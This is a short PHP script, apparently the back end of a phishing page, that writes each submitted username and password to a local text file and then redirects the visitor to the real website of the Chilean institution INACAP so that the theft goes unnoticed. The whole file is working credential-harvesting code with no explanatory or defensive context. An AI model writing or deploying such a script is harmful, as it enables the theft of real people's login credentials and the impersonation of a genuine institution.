<?php
$file = fopen("archivo.txt", "a");
fwrite($file, "Usuario : ".$_POST['UserName']." -  Contraseña : ".$_POST['Password']." ". PHP_EOL);
fclose($file);
header("Location:https://www.inacap.cl")
?>
